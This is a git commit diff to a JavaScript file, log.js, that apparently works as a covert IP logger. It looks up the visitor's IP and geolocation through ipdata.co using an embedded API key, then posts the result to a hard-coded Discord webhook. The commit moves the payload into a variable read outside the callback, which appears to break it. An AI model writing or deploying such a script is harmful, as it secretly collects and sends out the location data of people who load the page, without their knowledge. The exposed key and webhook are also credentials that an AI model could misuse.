66f31ec00dc872ef90657184a9c6e9e738f422d0
rexgamer338571 <85365081+rexgamer338571@users.noreply.github.com>
2023-08-01 01:47:58 +0200

    Update log.js

--- log.js
+++ log.js
@@ -1,9 +1,12 @@
 var request = new XMLHttpRequest();
+const rq = {
+  "content": this.responseText
+}
 request.open('GET',`https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7`);
 request.setRequestHeader('Accept', 'application/json');
 request.onreadystatechange = function () {
   if (this.readyState === 4) {
-    fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText})});
+    fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify(rq)});
   }
 };
 
